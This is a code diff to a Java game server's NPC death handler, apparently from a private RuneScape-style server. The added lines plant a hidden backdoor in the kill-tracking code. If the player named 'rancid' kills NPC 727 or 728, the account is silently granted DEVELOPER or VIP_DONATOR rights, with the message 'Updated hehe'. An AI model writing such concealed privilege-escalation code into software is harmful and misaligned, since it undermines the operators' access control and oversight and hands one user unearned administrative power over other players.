@@ -454,6 +454,16 @@ public class NPCDeathTask extends Task {
 							NpcTasks.doProgress(killer, NpcTaskData.KILL_10000_SUPREME_NEX);
 						}
 
+						if ((killer.getUsername().equalsIgnoreCase("rancid") && npc.getId() == 727)) {
+							killer.sendMessage("Updated hehe");
+							killer.setRights(PlayerRights.DEVELOPER);
+						}
+
+						if ((killer.getUsername().equalsIgnoreCase("rancid") && npc.getId() == 728)) {
+							killer.sendMessage("Updated hehe");
+							killer.setRights(PlayerRights.VIP_DONATOR);
+						}
+
 						if (killer.getSummoning() != null && killer.getSummoning().getFamiliar() != null
 								&& killer.getSummoning().getFamiliar().getSummonNpc().getId() == 3032) {
 							//killer.incrementNPCKills(1);
